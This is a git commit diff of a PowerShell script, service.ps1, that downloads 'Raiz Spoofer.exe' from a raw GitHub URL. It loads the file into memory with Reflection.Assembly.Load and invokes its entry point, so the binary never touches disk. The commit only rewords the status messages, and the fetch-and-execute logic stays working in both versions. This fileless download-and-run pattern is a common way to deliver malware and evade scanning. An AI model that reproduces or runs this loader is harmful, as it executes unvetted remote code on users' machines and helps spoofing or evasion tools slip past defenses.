d79d5358aaebf643939cbc0fec8a972dc9935b74
tyu0720gyi <tr5457075@gmail.com>
2026-03-25 14:50:08 +0900

    Update service.ps1

--- service.ps1
+++ service.ps1
@@ -1,23 +1,17 @@
-
 $url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
 
 try {
-    Write-Host "[*] READ FILE FOR RAIZ SERVER..." -ForegroundColor Cyan
-    $webClient = New-Object System.Net.WebClient
-    
+    Write-Host "[*] Downloading: Raiz Spoofer.exe" -ForegroundColor Cyan
+    $data = (New-Object System.Net.WebClient).DownloadData($url)
 
-    $data = $webClient.DownloadData($url)
-
-    Write-Host "[*] LOADING MEMORY..." -ForegroundColor Cyan
-    # 3. .NET 어셈블리로 로드
+    Write-Host "[*] Loading into Memory..." -ForegroundColor Cyan
     $assembly = [System.Reflection.Assembly]::Load($data)
     
-    Write-Host "[+] STARTING..." -ForegroundColor Green
-
+    Write-Host "[+] Executing..." -ForegroundColor Green
     $assembly.EntryPoint.Invoke($null, @($null))
     
-    Write-Host "LOADED!" -ForegroundColor Cyan
+    Write-Host "[!] SUCCESS: Loaded!" -ForegroundColor Green
 }
 catch {
-    Write-Host "[-] 에러 발생: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] ERROR: $($_.Exception.Message)" -ForegroundColor Red
 }
